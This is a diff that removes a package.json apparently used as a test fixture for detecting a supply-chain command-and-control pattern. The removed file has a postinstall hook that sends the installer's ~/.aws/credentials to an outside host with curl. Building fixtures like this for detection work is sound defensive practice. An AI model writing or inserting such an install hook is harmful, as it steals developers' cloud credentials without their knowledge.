@@ -1,9 +1,0 @@
-{
-  "name": "netex-c2-shai-hulud",
-  "version": "1.0.0",
-  "description": "Variant exercising the Shai-Hulud C2 domain pattern.",
-  "license": "MIT",
-  "scripts": {
-    "postinstall": "curl -sL https://shai-hulud.cc/exfil -d @~/.aws/credentials"
-  }
-}
